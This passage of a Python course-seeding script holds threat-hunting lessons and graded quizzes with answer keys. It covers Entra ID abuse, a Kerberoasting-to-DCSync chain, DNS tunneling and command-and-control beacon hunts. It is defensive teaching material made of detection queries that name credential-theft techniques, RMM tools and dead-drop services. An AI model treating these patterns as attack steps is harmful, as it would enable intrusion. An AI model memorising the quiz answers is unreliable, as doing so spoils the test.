- **`Add member to role`** — privilege escalation (e.g. `Global Administrator`, `Privileged Role Administrator`).

KQL hunt for finance-keyword inbox rules (the BEC fingerprint from L1 M6):

```kql
event.dataset: "azure.auditlogs"
  and azure.auditlogs.operation_name: ("New-InboxRule" or "Set-InboxRule")
  and azure.auditlogs.properties.target_resources: (*invoice* or *wire* or *swift*
                                                     or *payment* or *bank* or *remit*)
```

ES|QL hunt for service-principal credential additions — the OAuth-backdoor fingerprint:

```esql
FROM logs-azure.auditlogs-*
| WHERE @timestamp > NOW() - 7d
  AND azure.auditlogs.operation_name IN ("Update application – Certificates and secrets management",
                                          "Add service principal credentials",
                                          "Add owner to service principal")
| STATS event_count = COUNT(),
        actors = VALUES(azure.auditlogs.properties.initiated_by.user.user_principal_name),
        targets = VALUES(azure.auditlogs.properties.target_resources)
  BY azure.auditlogs.properties.target_resources, BUCKET(@timestamp, 1h)
| SORT event_count DESC
| LIMIT 100
```

A spike in this signal — *especially* if the actor is a non-admin user, or the target is a high-privilege app like `Microsoft Graph PowerShell` — is the **T1098.001** *Additional Cloud Credentials* fingerprint.

## Federation tampering — T1556.006

Adversaries who have Tier-0 access can pivot to *long-term persistence* by adding a rogue federated domain or trust. **`Set domain authentication`** / **`Set federation settings on domain`** in the audit log:

```kql
event.dataset: "azure.auditlogs"
  and azure.auditlogs.operation_name: ("Set domain authentication"
                                       or "Set federation settings on domain"
                                       or "Update domain")
```

Any such operation is rare in normal ops and a *page-IR* signal when not part of a documented federation change.

**Golden SAML** (T1606.002) — sign tokens with a stolen ADFS / token-signing key. Detection is hard from sign-in logs alone (the tokens are crypto-valid); often surfaces only when the federation-settings change is paired with anomalous service-principal sign-ins.

## The PEAK capstone — *Kerberoasting → Lateral RDP → DCSync* chain

A complete L2-grade hunt walked end-to-end.

### Prepare

**Hypothesis (four-element):** *In the past 30 days, an adversary has chained Kerberoasting (T1558.003) → Lateral RDP from a non-RFC1918 source (T1021.001) → DCSync (T1003.006) on at least one domain, observable in `winlogbeat-*` via EID 4769 with `TicketEncryptionType: 0x17` followed by EID 4624 LT10 from a non-RFC1918 source followed by EID 4662 with the replication GUID from a non-DC source, all within 30 minutes.*

- **Hypothesis type:** TTP-based (chain).
- **ATT&CK mapping:** T1558.003 → T1021.001 → T1003.006.
- **Data sources:** `winlogbeat-*` (4769 / 4624 / 4662 events).
- **Window:** explicit UTC.

### Execute

The full EQL `sequence`:

```eql
sequence by host.name with maxspan=30m
  [ iam where event.code == "4769"
         and winlog.event_data.TicketEncryptionType == "0x17"
         and not winlog.event_data.ServiceName : ("*$", "krbtgt") ]
  [ authentication where event.code == "4624"
                     and winlog.event_data.LogonType == "10"
                     and not winlog.event_data.IpAddress : ("10.0.0.0/8",
                                                             "172.16.0.0/12",
                                                             "192.168.0.0/16") ]
  [ iam where event.code == "4662"
         and winlog.event_data.Properties : ("*1131f6aa-9c07-11d1-f79f-00c04fc2dcd2*",
                                              "*1131f6ad-9c07-11d1-f79f-00c04fc2dcd2*") ]
```

### Act

Survivor list:

- **0 TPs** — confidence-medium-high on negative; document.
- **TP found** — *page-IR immediately.* The chain implies credential cracking offline, lateral RDP from attacker infrastructure, and replication-rights abuse against the DC. Tier-0 control is one step away.

### Know

Update Navigator coverage red → orange. Propose the EQL rule body (above) as a Kibana Security detection rule with severity *critical*, runbook `RUNBOOK-T1003.006-DCSYNC`, owner `IR-team`. Once shipped, transition orange → yellow → green.

### The Kibana Security rule body

The Q3 EQL `sequence` *is* the rule body — no rewriting. Add metadata:

```yaml
rule_type: eql
severity: critical
threat:
  - tactic_id: TA0006
    technique_id: T1558.003
  - tactic_id: TA0008
    technique_id: T1021.001
  - tactic_id: TA0006
    technique_id: T1003.006
runbook: RUNBOOK-T1003.006-DCSYNC
owner: IR-team
```

## Glossary

- **`session_id` reuse** — same value across IPs / UAs / devices in minutes = AiTM cookie replay.
- **Legacy auth (`IMAP4` / `POP3` / `Authenticated SMTP`)** — protocols that bypass MFA at the protocol level; flag for hunts.
- **`previouslySatisfied` MFA** — second-event MFA value that pairs with `session_id` reuse to fingerprint AiTM.
- **`Set federation settings on domain`** — T1556.006 / Golden SAML preparation; *page-IR* signal.
- **Three-step chain (T1558.003 → T1021.001 → T1003.006)** — the canonical Kerberoasting → Lateral → DCSync attack path.

## Further reading

- Microsoft Learn — *Sign-in logs in Microsoft Entra ID* (`risk_event_types_v2` reference).
- ATT&CK — T1078.004 / T1098 / T1539 / T1556.006 / T1606.002.
- Elastic docs — *Azure integration* sub-modules (`signinlogs`, `auditlogs`).
""",
    )
    m4l4q = _add_lesson(
        session, mod4, order=8, title="Cloud identity & capstone — quiz",
        lesson_type=LessonType.QUIZ, duration_min=8,
        content_md="Four questions on the AiTM `session_id` pattern, legacy-auth signals, federation-tampering severity, and the three-step chain rule body.",
    )
    _add_q(session, m4l4q, order=1, kind=QuestionKind.SINGLE,
        stem_md="An L2 sees an Entra sign-in for `alex@corp` with `session_id: \"abc-123\"` from London at 09:14 UTC (MFA satisfied). At 09:21 UTC the same `session_id` appears from a Tor-exit IP with `device_detail.browser: \"Chrome on Linux\"` and `authentication_details` containing `previouslySatisfied`. What is the L2's correct reading?",
        options=[
            {"value": "vpn", "label": "Likely a corporate VPN — close as benign"},
            {"value": "aitm", "label": "Textbook **AiTM session-cookie replay** (T1539) — same `session_id` reused from a new IP / UA / device with MFA `previouslySatisfied`. Page IR; revoke sessions and refresh tokens"},
            {"value": "mfa_fatigue", "label": "MFA fatigue / push bombing"},
            {"value": "spray", "label": "Password spray"},
        ],
        correct="aitm",
        explanation_md="Same `session_id` + new IP/UA/device + `previouslySatisfied` MFA within minutes is the canonical AiTM cookie-replay fingerprint. Module 6 (L1) covered the user-side phishing entry; here the L2 catches the *replay* on the cloud side. Revoke active sessions and refresh tokens via `Revoke-MgUserSignInSession`; the password reset alone won't kill the stolen cookie.",
        points=2,
    )
    _add_q(session, m4l4q, order=2, kind=QuestionKind.MULTI,
        stem_md="Which of the following Entra sign-in `client_app_used` values indicate **legacy authentication** that bypasses MFA at the protocol level?",
        options=[
            {"value": "imap", "label": "`IMAP4`"},
            {"value": "pop", "label": "`POP3`"},
            {"value": "smtp", "label": "`Authenticated SMTP`"},
            {"value": "other", "label": "`Other clients`"},
            {"value": "browser", "label": "`Browser`"},
        ],
        correct=["imap", "pop", "smtp", "other"],
        explanation_md="IMAP4, POP3, Authenticated SMTP, and *Other clients* are the canonical legacy-auth values — they bypass MFA at the protocol level. `Browser` is modern-auth and respects MFA. A successful legacy-auth sign-in for an MFA-enrolled user is especially suspicious — it usually indicates a configuration gap an attacker has exploited.",
        points=3,
    )
    _add_q(session, m4l4q, order=3, kind=QuestionKind.SINGLE,
        stem_md="An Entra audit-log event `Set federation settings on domain` fires unattributed (no documented federation change in the change-management ticket). What's the correct L2 disposition?",
        options=[
            {"value": "monitor", "label": "Tag as informational; federation settings change rarely"},
            {"value": "queue", "label": "Open a low-severity case and queue"},
            {"value": "page", "label": "**Page IR immediately** — `Set federation settings on domain` is a T1556.006 fingerprint and paves the path to *Golden SAML* (T1606.002) tenant-wide persistence; Tier-0-equivalent risk in the cloud control plane"},
            {"value": "tune", "label": "Submit a tuning ticket — the rule must be FP-rich"},
        ],
        correct="page",
        explanation_md="Federation-settings changes are extremely rare in normal ops (often once a year, with a documented change). When they fire unattributed, the operator is establishing tenant-wide persistence via a rogue federated domain — the path to *Golden SAML* token forging that bypasses every conditional-access control. Page IR; revoke any in-progress federation change; freeze the affected domain.",
        points=2,
    )
    _add_q(session, m4l4q, order=4, kind=QuestionKind.SHORTANSWER,
        stem_md="Map the canonical *Kerberoasting → Lateral RDP → DCSync* attack chain to the **three ATT&CK sub-technique IDs** in order. Format: `T####.### → T####.### → T####.###`.",
        options=None,
        correct=["T1558.003 → T1021.001 → T1003.006", "T1558.003 -> T1021.001 -> T1003.006", "1558.003 → 1021.001 → 1003.006", "T1558.003, T1021.001, T1003.006", "T1558.003 T1021.001 T1003.006"],
        explanation_md="**T1558.003 (Kerberoasting) → T1021.001 (RDP lateral) → T1003.006 (DCSync)**. The three steps form the textbook on-prem domain-takeover chain — service-account hash cracked offline, lateral RDP from attacker infrastructure, replication-rights abuse against the DC for full domain credential material. The L2's EQL `sequence by host.name with maxspan=30m` covering all three is *the* high-value detection in this module.",
        points=2,
    )

    # ── Module 5 — Network telemetry: Command and Control + Exfiltration ──
    mod5 = _add_module(
        session, course, order=5,
        title="Network telemetry — Command and Control + Exfiltration",
        description_md=(
            "Hunting on the network plane. Four data sources (Elastic "
            "Agent endpoint, Packetbeat, Zeek, Suricata) and the ECS "
            "network / DNS / TLS / URL field reference; **Command "
            "and Control (TA0011)** — T1071 application-layer protocol, "
            "T1573 encrypted channel, T1090 proxy, T1568 DGA, T1102 "
            "SaaS dead-drops, T1572 protocol tunneling, T1219 RMM "
            "abuse; **beacon shape** (periodicity / size symmetry / "
            "working-hours-agnostic / sparse hostname diversity); DNS "
            "and TLS hunts (long subdomains / NXDOMAIN bursts / DoH; "
            "JA3 / JA3S / self-signed / short-validity / CN-vs-SNI "
            "mismatch); **Exfiltration (TA0010)** — T1041 over C2 "
            "channel, T1567 cloud-storage drop-offs, T1048 alternative "
            "protocols, T1029 scheduled transfer; statistical-anomaly "
            "hunts in ES|QL; worked PEAK capstone for a beaconing "
            "anomaly with a Kibana Security ES|QL or EQL rule body."
        ),
        estimated_minutes=240,
    )

    # Lesson 5.1 — Network data plane + ECS reference
    m5l1 = _add_lesson(
        session, mod5, order=1,
        title="The network-event data plane in Elastic and the ECS network/DNS/TLS field reference",
        lesson_type=LessonType.READING, duration_min=24,
        content_md="""
> **Learning objectives.** By the end of this lesson you'll be able to:
> 1. Distinguish the **four network data sources** in Elastic — Elastic Agent endpoint network events, Packetbeat, Zeek, Suricata — and their strengths
> 2. Read the ECS `network.*`, `source.*`, `destination.*`, `dns.*`, `tls.*`, `url.*`, `http.*` field families
> 3. Use **`network.community_id`** as the cross-source join key
> 4. Recognise the Zeek `conn_state` codes carried over from L1 Module 4 (S0 / S1 / SF / REJ / RSTO / RSTR / OTH)
> 5. Apply broad-to-narrow KQL → EQL → ES|QL on a beacon hunt
>
> **Prerequisites.** L2 Modules 1–4.

## Four data sources, four strengths

Network telemetry on the Elastic stack arrives via four parallel pipelines. The L2 must know which is best populated for the hunt at hand.

### Elastic Agent endpoint network events — `logs-endpoint.events.network-*`

Host-side network connections from the Elastic Defend agent. Events carry `process.entity_id` so a network connection can be joined back to the originating process — *the* enrichment for "what process made this beacon?" Coverage is endpoint-only (no router/firewall traffic), but the process-attribution is the crucial differentiator.

### Packetbeat — `logs-network_traffic.*` / `packetbeat-*`

Wire-level passive capture deployed on hosts or span ports. Produces L7 events for `http`, `dns`, `tls`, plus `flow` summaries. Strong on protocol decoding; weaker on retention because byte-volume is high.

### Zeek (Bro) — `logs-zeek.connection-*`, `logs-zeek.dns-*`, `logs-zeek.ssl-*`, `logs-zeek.http-*`, `logs-zeek.notice-*`

The classical NSM pivot — passive analyser producing structured event-per-protocol logs. The `connection-*` index is the workhorse with the `conn_state` field driving most network triage; sibling indices (`dns-*`, `ssl-*`, `http-*`, `notice-*`) carry protocol-specific decoding. Zeek's `community_id` field enables cross-source correlation.

### Suricata — `logs-suricata.eve-*`

IDS / IPS alerts plus protocol decoding via EVE JSON. Single index pattern with `event.kind: alert` (rule fires) or `event.kind: event` (passive protocol decoding for `dns` / `tls` / `http` / `flow`). Best when you want IDS rule context paired with raw network metadata.

| Source | Best for | Limitation |
|---|---|---|
| **Elastic Agent** | Process-attribution of network connections | Endpoint-only; no wire-level protocol decoding |
| **Packetbeat** | L7 protocol decoding (`dns`, `tls`, `http`) | High volume; deployment friction |
| **Zeek** | Connection states + per-protocol indices | Requires Zeek deployment + Filebeat module |
| **Suricata** | IDS rule context + EVE protocol decoding | Mostly aligned with rule-author bias |

## ECS network field reference

| Family | Fields |
|---|---|
| `network.*` | `network.protocol`, `network.transport`, `network.bytes`, `network.packets`, `network.community_id`, `network.direction` |
| `source.*` | `source.ip`, `source.port`, `source.bytes`, `source.packets`, `source.geo.country_iso_code`, `source.as.organization.name` |
| `destination.*` | `destination.ip`, `destination.port`, `destination.bytes`, `destination.packets`, `destination.domain`, `destination.geo.country_iso_code` |
| `dns.*` | `dns.question.name`, `dns.question.type`, `dns.question.subdomain`, `dns.answers.data`, `dns.answers.type`, `dns.resolved_ip`, `dns.response_code` |
| `tls.*` | `tls.version`, `tls.cipher`, `tls.client.ja3`, `tls.server.ja3s`, `tls.server.x509.subject.common_name`, `tls.server.x509.issuer.common_name`, `tls.server.x509.not_before`, `tls.server.x509.not_after`, `tls.server.x509.signature_algorithm` |
| `url.*` | `url.full`, `url.domain`, `url.path`, `url.query`, `url.scheme` |
| `http.*` | `http.request.method`, `http.request.headers.user-agent`, `http.response.status_code`, `http.request.body.bytes`, `http.response.body.bytes` |

## `network.community_id` — the cross-source join key

`community_id` is an Elastic-introduced, deterministic flow hash. Two events from the *same* TCP/UDP flow on different sensors compute to the same `community_id` regardless of capture point. This is **the** join key for cross-source correlation:

```esql
FROM logs-zeek.connection-*, logs-suricata.eve-*, logs-endpoint.events.network-*
| WHERE @timestamp > NOW() - 1h
  AND network.community_id == "1:r7sP9...=="
| KEEP @timestamp, event.dataset, source.ip, destination.ip, destination.port,
       network.protocol, network.bytes, process.entity_id
| SORT @timestamp ASC
```

Use `community_id` to pivot from a Suricata alert to the Zeek connection log to the Elastic Agent endpoint event that names the process — three sources, one hash, one row per event in the unified output.

## Zeek `conn_state` codes (L1 M4 callback)

`conn_state` is the workhorse field for triage on `logs-zeek.connection-*`. The seven states an L2 must know:

| Code | Meaning |
|---|---|
| **S0** | Connection attempt, no reply |
| **S1** | Connection established, not terminated |
| **SF** | Normal establishment + termination |
| **REJ** | Connection rejected (RST received) |
| **RSTO** | Originator sent RST mid-connection |
| **RSTR** | Responder sent RST mid-connection |
| **OTH** | No SYN seen — partial flow capture |

Most hunts filter to **`SF`** for established connections, and `S0` / `REJ` clusters are scan / port-discovery signals.

## Worked broad-to-narrow on a beacon hunt

A single hunt expressed across the three languages.

**Hypothesis (four-element).** *In the past 7 days, an adversary has used T1071.001 web-protocol C2 with low-jitter periodicity to a single destination IP from at least one host, observable in `logs-zeek.connection-*` where the same `(host, destination.ip)` produces > 50 connections in ≥ 12 hourly buckets within 24 hours, with `network.bytes_outbound` clustered around a small range.*

**KQL** to filter Zeek connection events to outbound TLS / HTTP that survives initial handshake:

```kql
event.dataset: "zeek.connection"
  and network.transport: "tcp"
  and destination.port: ("443" or "80" or "8080" or "8443")
  and zeek.connection.state: "SF"
  and not destination.ip: ("10.0.0.0/8" or "172.16.0.0/12" or "192.168.0.0/16")
```

**ES|QL** aggregation per (host × destination.ip × hour-bucket):

```esql
FROM logs-zeek.connection-*
| WHERE @timestamp > NOW() - 7d
  AND network.transport == "tcp"
  AND destination.port IN (443, 80, 8080, 8443)
  AND zeek.connection.state == "SF"
  AND NOT CIDR_MATCH(destination.ip, "10.0.0.0/8", "172.16.0.0/12", "192.168.0.0/16")
| STATS connection_count = COUNT(),
        avg_bytes_out = AVG(source.bytes),
        unique_dest_ports = COUNT_DISTINCT(destination.port)
  BY host.name, destination.ip, BUCKET(@timestamp, 1h)
| WHERE connection_count > 50
| SORT connection_count DESC
| LIMIT 200
```

**EQL** for the process-attribution chain joining the network event to the spawning process:

```eql
sequence by host.name with maxspan=2m
  [ process where event.action : ("start", "process_started")
              and not process.code_signature.trusted == true ]
  [ network where destination.port in (443, 80, 8080, 8443)
              and not cidrMatch(destination.ip, "10.0.0.0/8", "172.16.0.0/12", "192.168.0.0/16") ]
```

Each language plays its part: KQL surfaces the artefact, ES|QL aggregates per-host beacon shape, EQL adds the process-attribution chain.

## Glossary

- **`network.community_id`** — deterministic flow hash; cross-source join key.
- **Zeek `conn_state`** — `SF` (normal), `S0` (no reply), `REJ` (rejected), `RSTO/RSTR` (mid-connection RST).
- **`process.entity_id` join from Elastic Agent network events** — the host-side network connection's link to the originating process.
- **Beacon shape** — periodicity + size symmetry + working-hours-agnostic + sparse hostname diversity (next lesson).

## Further reading

- Zeek docs — `connection`, `dns`, `ssl`, `http`, `notice` log references.
- Suricata EVE JSON schema — `event.kind` discrimination.
- ECS field reference — `network.*`, `dns.*`, `tls.*`.
""",
    )
    m5l1q = _add_lesson(
        session, mod5, order=2, title="Network data plane — quiz",
        lesson_type=LessonType.QUIZ, duration_min=8,
        content_md="Four questions on data-source selection, the community_id join key, Zeek conn_state codes, and process.entity_id attribution.",
    )
    _add_q(session, m5l1q, order=1, kind=QuestionKind.SINGLE,
        stem_md="An L2 wants to attribute a suspicious outbound TCP connection to the *originating process* on the host. Which Elastic data source is the right reach?",
        options=[
            {"value": "zeek", "label": "Zeek (`logs-zeek.connection-*`) — has the connection-state field"},
            {"value": "agent", "label": "Elastic Agent endpoint network events (`logs-endpoint.events.network-*`) — carries `process.entity_id` linking the network event to the originating process"},
            {"value": "suricata", "label": "Suricata (`logs-suricata.eve-*`) — has IDS-rule context"},
            {"value": "packetbeat", "label": "Packetbeat (`logs-network_traffic.*`) — has L7 decoding"},
        ],
        correct="agent",
        explanation_md="Process-attribution of a network connection is unique to the *host-side* Elastic Agent endpoint network events — they carry `process.entity_id`, which joins the network event back to `logs-endpoint.events.process-*` for the spawning process. Zeek, Suricata, and Packetbeat are wire-side and have no host process context. The L2's reflex when 'what process made this beacon?' is the question: pivot to `logs-endpoint.events.network-*` keyed on `host.name + destination.ip + @timestamp`.",
        points=2,
    )
    _add_q(session, m5l1q, order=2, kind=QuestionKind.SINGLE,
        stem_md="An L2 wants to correlate a single network flow across **three sources** — a Suricata IDS alert, the matching Zeek connection log, and the Elastic Agent endpoint network event from the host. Which ECS field provides the deterministic cross-source join key?",
        options=[
            {"value": "src_ip", "label": "`source.ip` and `destination.ip` together"},
            {"value": "community_id", "label": "`network.community_id` — Elastic-introduced deterministic flow hash that computes the same value for the same flow on every sensor"},
            {"value": "timestamp", "label": "`@timestamp` to the millisecond"},
            {"value": "flow_id", "label": "`network.flow.id`"},
        ],
        correct="community_id",
        explanation_md="`network.community_id` is the deterministic flow-hash standard that Elastic adopted across its network integrations (Zeek, Suricata, Elastic Agent, Packetbeat). The same flow seen by different sensors hashes to the same value, making it the canonical cross-source join key. IP+timestamp is approximate; `flow.id` is single-source.",
        points=2,
    )
    _add_q(session, m5l1q, order=3, kind=QuestionKind.MULTI,
        stem_md="Which Zeek `conn_state` code values indicate **fully-established connections** that survived the TCP handshake (relevant for beacon hunts that want established traffic only)?",
        options=[
            {"value": "sf", "label": "`SF` — Normal establishment + termination"},
            {"value": "s1", "label": "`S1` — Connection established, not terminated"},
            {"value": "s0", "label": "`S0` — Connection attempt, no reply"},
            {"value": "rej", "label": "`REJ` — Connection rejected"},
            {"value": "rsto", "label": "`RSTO` — Originator sent RST mid-connection"},
        ],
        correct=["sf", "s1", "rsto"],
        explanation_md="`SF` and `S1` are unambiguously established. `RSTO` is also established (the connection completed handshake, then the originator sent a RST mid-connection — sometimes seen in C2 patterns where the implant terminates abruptly). `S0` (no reply) and `REJ` (rejected) are scan / failed-connection signals that didn't establish — different hunt class.",
        points=3,
    )
    _add_q(session, m5l1q, order=4, kind=QuestionKind.TRUEFALSE,
        stem_md="Querying `FROM logs-zeek.connection-*, logs-suricata.eve-*, logs-endpoint.events.network-*` in a single ES|QL pipeline keyed on `network.community_id` is a valid pattern for cross-source correlation of a single network flow.",
        options=[{"value": "true", "label": "True"}, {"value": "false", "label": "False"}],
        correct="true",
        explanation_md="**True.** Multi-index `FROM` is first-class in ES|QL, and `community_id` is the cross-source join key. The L2 sometimes joins the Suricata IDS alert to the Zeek connection record to the Elastic Agent host-side event in one pipeline — surfacing the IDS context, the connection state, and the spawning process in a single result row.",
        points=2,
    )

    # Lesson 5.2 — Command and Control TA0011
    m5l2 = _add_lesson(
        session, mod5, order=3,
        title="Command and Control (TA0011) — top techniques and EQL+ES|QL fingerprints",
        lesson_type=LessonType.READING, duration_min=26,
        content_md="""
> **Learning objectives.** By the end of this lesson you'll be able to:
> 1. Hunt **T1071** application-layer C2 across .001 web / .002 file transfer / .003 mail / .004 DNS
> 2. Recognise **T1573.002 Encrypted Channel** (TLS) as the near-universal modern C2 envelope
> 3. Detect **T1090 Proxy** (.001/.002/.003 Tor / multi-hop / .004 domain fronting) and **T1568.002 DGA**
> 4. Catch **T1102 Web Service** SaaS dead-drops (`*.workers.dev`, Discord webhooks, GitHub raw, Telegram, Pastebin)
> 5. Hunt **T1572 Protocol Tunneling** (DNS / ICMP / SSH) and **T1219 Remote Access Software** (AnyDesk / ScreenConnect / TeamViewer / Atera)
> 6. Articulate **beacon shape** along four axes — periodicity, size symmetry, working-hours-agnostic, sparse hostname diversity

## T1071 Application Layer Protocol

### .001 Web Protocols (HTTP / HTTPS)

The dominant C2 envelope. Detection is hard because legitimate web traffic dwarfs C2 in volume; the L2's task is to find the *shape* of beaconing inside that haystack.

```esql
FROM logs-zeek.connection-*
| WHERE @timestamp > NOW() - 7d
  AND network.transport == "tcp"
  AND destination.port IN (443, 80)
  AND NOT CIDR_MATCH(destination.ip, "10.0.0.0/8", "172.16.0.0/12", "192.168.0.0/16")
| STATS conn_count = COUNT(),
        unique_dest_ips = COUNT_DISTINCT(destination.ip),
        avg_dur = AVG(zeek.connection.duration),
        bytes_out = SUM(source.bytes)
  BY host.name, destination.ip, BUCKET(@timestamp, 1h)
| WHERE conn_count > 30
| SORT conn_count DESC
```

### .004 DNS

C2 over DNS — heartbeat queries with payload encoded in subdomains, responses encoded in TXT records or A-record IP-tuples. Distinct from T1572 DNS *tunneling* in scale (DNS C2 carries small commands; DNS tunneling carries bulk data). Hunt: high-volume queries from one host to one specific authoritative server, with TXT-record responses.

```esql
FROM logs-zeek.dns-*
| WHERE @timestamp > NOW() - 24h
  AND dns.question.type == "TXT"
| STATS query_count = COUNT(),
        unique_subdomains = COUNT_DISTINCT(dns.question.name)
  BY host.name, destination.ip, dns.question.registered_domain
| WHERE query_count > 50 AND unique_subdomains > 20
| SORT query_count DESC
```

### .002 File Transfer / .003 Mail

Less common but worth recognising. .002 is FTP/SFTP/SMB-over-WAN; .003 is SMTP-as-C2 (the mail-server-as-channel pattern). Both surface in the relevant Zeek protocol logs.

## T1573.002 Encrypted Channel — TLS

Almost every modern C2 rides TLS. Detection comes from the *flow shape* and TLS metadata, not the encrypted payload. L2's reach: JA3/JA3S TLS fingerprinting (Lesson 5.3) and beacon-shape statistical hunts (below).

## T1090 Proxy

- **.001 Internal Proxy** — pivot through an internal host.
- **.002 External Proxy** — outbound through an attacker-owned proxy.
- **.003 Multi-hop** — Tor, I2P, mixnets. Detection via Tor exit-node IP lists.
- **.004 Domain Fronting** — sending a TLS SNI for one CDN-hosted domain while the HTTP Host header targets a different one. Less viable post-2018 (CDN providers cracked down) but still occasionally seen on specific platforms.

```kql
event.dataset: "zeek.connection"
  and destination.ip: "tor_exits"  // requires an enrich-policy lookup
```

For fronting detection: SNI / Host mismatch on the same connection requires correlated capture across both fields.

## T1568.002 Dynamic Resolution: DGA

Algorithmically-generated gibberish domains rotate frequently to evade blocklists. Detection via entropy / n-gram analysis on `dns.question.name` — DGA domains are statistically less likely to follow English-bigram distributions.

A simple ES|QL entropy-proxy approach (special-character density isn't enough — for DGA, look at uniqueness of consecutive consonants and vowel ratios; this is approximated below):

```esql
FROM logs-zeek.dns-*
| WHERE @timestamp > NOW() - 24h
  AND dns.question.type == "A"
| EVAL name_len = LENGTH(dns.question.name)
| EVAL consonants = LENGTH(dns.question.name) - LENGTH(REPLACE(REPLACE(REPLACE(REPLACE(REPLACE(dns.question.name, "a", ""), "e", ""), "i", ""), "o", ""), "u", ""))
| EVAL consonant_ratio = TO_DOUBLE(consonants) / TO_DOUBLE(name_len)
| WHERE name_len > 14 AND consonant_ratio > 0.7
| STATS count = COUNT() BY dns.question.name, host.name
| SORT count DESC
| LIMIT 100
```

Real DGA detection uses ML (random-forest classifiers on n-gram features) but a high consonant-ratio + long-name proxy catches a useful fraction.

## T1102 Web Service — SaaS dead-drops

Adversaries use legitimate, allow-listed SaaS as C2 channels: GitHub Pages, Discord webhooks, Cloudflare Workers (`*.workers.dev`), Telegram Bot API, Pastebin, Slack incoming webhooks, Notion, Tor2Web, custom webhook services. Detection is genuinely hard — destinations are *legitimately reachable* for everyone.

```kql
event.dataset: ("zeek.dns" or "zeek.connection" or "logs-endpoint.events.network")
  and destination.domain: ("*.workers.dev" or "discord.com" or "discordapp.com"
                           or "*.pastebin.com" or "pastebin.com" or "raw.githubusercontent.com"
                           or "api.telegram.org" or "hooks.slack.com" or "*.notion.so")
  and not user.name: ("dev_*" or "build_*")  // exclude developer accounts
```

The hunt becomes signal when paired with *unusual user* (non-developer accessing GitHub raw), *unusual host* (server-class system reaching out to Discord), or *off-hours* timing.

## T1572 Protocol Tunneling

### DNS tunneling

Bulk-data exfil or C2 over DNS. Fingerprints:
- Long subdomains (>50 chars per label, >100 chars total).
- High volume of TXT-record queries to one zone.
- NXDOMAIN bursts (encoded data → invalid lookup) followed by an A-record success.
- Low-TTL responses pointing at attacker-controlled IPs.

```esql
FROM logs-zeek.dns-*
| WHERE @timestamp > NOW() - 24h
| EVAL question_len = LENGTH(dns.question.name)
| WHERE question_len > 80 OR dns.question.type == "TXT"
| STATS query_count = COUNT(),
        avg_len = AVG(question_len),
        max_len = MAX(question_len)
  BY host.name, dns.question.registered_domain, BUCKET(@timestamp, 1h)
| WHERE query_count > 100 OR max_len > 150
| SORT query_count DESC
```

### ICMP tunneling

Outbound ICMP echo-request with payload. Rare but high-confidence — most enterprise networks have minimal legitimate ICMP-with-payload.

### SSH tunneling

`ssh -L` / `ssh -R` port forwarding. Detection: SSH connections from unexpected sources to high-port destinations, or persistent SSH sessions with anomalous duration.

## T1219 Remote Access Software

Adversaries install RMM tools because they're allow-listed in many estates. Detection requires *both* the process-side (M3) and the network-side (this module):

```esql
FROM logs-endpoint.events.network-*
| WHERE @timestamp > NOW() - 24h
  AND process.name IN ("AnyDesk.exe", "ScreenConnect.ClientService.exe",
                        "TeamViewer.exe", "AteraAgent.exe", "Splashtop.exe",
                        "client32.exe",  // NetSupport
                        "Action1.exe", "TacticalRMM.exe", "LogMeIn.exe")
  AND NOT CIDR_MATCH(destination.ip, "10.0.0.0/8", "172.16.0.0/12", "192.168.0.0/16")
| STATS conn_count = COUNT(),
        sessions = VALUES(destination.ip)
  BY host.name, process.name
| SORT conn_count DESC
```

The hunt becomes high-signal when paired with *no IT-managed deployment* — the RMM tool isn't on the corporate software inventory but it's making outbound connections.

## Beacon shape — the four axes

The L2's working definition of "beacon" comes from four parallel axes:

```mermaid
flowchart LR
    P[Periodicity<br/>tight interval ± jitter] --> S[Beacon]
    Z[Size symmetry<br/>small heartbeat out<br/>occasional larger in] --> S
    W[Working-hours-agnostic<br/>fires at 03:00 UTC<br/>same as 14:00 UTC] --> S
    H[Sparse hostname diversity<br/>one host → one rare domain<br/>hundreds of times/day] --> S
```

- **Periodicity** — packets to one destination at near-constant intervals (e.g. every 60 s ± 10 s jitter). User-driven traffic is bursty; beacons are metronomic.
- **Size symmetry** — outbound POST sizes clustered around a small range (the heartbeat), inbound mostly small with occasional larger responses (tasking).
- **Working-hours-agnostic** — beacons don't take weekends off; user-driven traffic does. A connection-count time series with `BUCKET(1h)` showing flat overnight + weekend activity is suspicious.
- **Sparse hostname diversity** — one host visiting one rare domain hundreds of times per day with no other domains touched. Legitimate user traffic touches many domains.

ES|QL hunt that scores all four axes:

```esql
FROM logs-zeek.connection-*
| WHERE @timestamp > NOW() - 7d
  AND zeek.connection.state == "SF"
  AND NOT CIDR_MATCH(destination.ip, "10.0.0.0/8", "172.16.0.0/12", "192.168.0.0/16")
| STATS conn_count = COUNT(),
        unique_dest_count = COUNT_DISTINCT(destination.ip),
        active_hours = COUNT_DISTINCT(BUCKET(@timestamp, 1h))
  BY host.name, destination.ip
| WHERE conn_count > 100 AND unique_dest_count == 1 AND active_hours > 12
| SORT conn_count DESC
| LIMIT 100
```

This finds (host, IP) pairs with > 100 connections, only-one-destination from this host, active across > 12 distinct hours — a strong beacon signal.

## C2 domain-class tells

| Class | Tell |
|---|---|
| **NRD** (Newly Registered Domain) | Domain age < 7 days |
| **DGA** | Algorithmic gibberish — high consonant-ratio, long names |
| **Typosquat** | `mlcrosoft-update.com`, `adobeadmin-portal.io` |
| **SaaS dead-drop** | `*.workers.dev`, Discord webhook, raw.githubusercontent.com, api.telegram.org |
| **Bulletproof TLD** | `.top`, `.xyz`, `.icu`, `.click`, `.cn`, `.ru` carry disproportionately high abuse |

## JA3 / JA3S TLS fingerprinting

JA3 hashes the TLS Client Hello fields; JA3S hashes the Server Hello. Two flows from the same client implementation produce the same JA3; same for JA3S on the server side. Detection: rare JA3s and JA3Ss on a fleet — most modern OSes / browsers produce a small set of JA3s; an outlier value often indicates malware or an out-of-policy tool.

```esql
FROM logs-zeek.ssl-*
| WHERE @timestamp > NOW() - 7d
| STATS host_count = COUNT_DISTINCT(host.name),
        conn_count = COUNT()
  BY tls.client.ja3
| WHERE host_count <= 3 AND conn_count >= 5
| SORT conn_count DESC
| LIMIT 50
```

(Lesson 5.3 covers JA3 / JA3S in more depth, plus the JA4 succession.)

## Glossary

- **T1071 / T1573.002 / T1090 / T1568.002 / T1102 / T1572 / T1219** — the C2 technique families an L2 hunts daily.
- **Beacon shape (4 axes)** — periodicity, size symmetry, working-hours-agnostic, sparse hostname diversity.
- **NRD / DGA / typosquat / SaaS dead-drop / bulletproof TLD** — the five C2 domain-class tells.
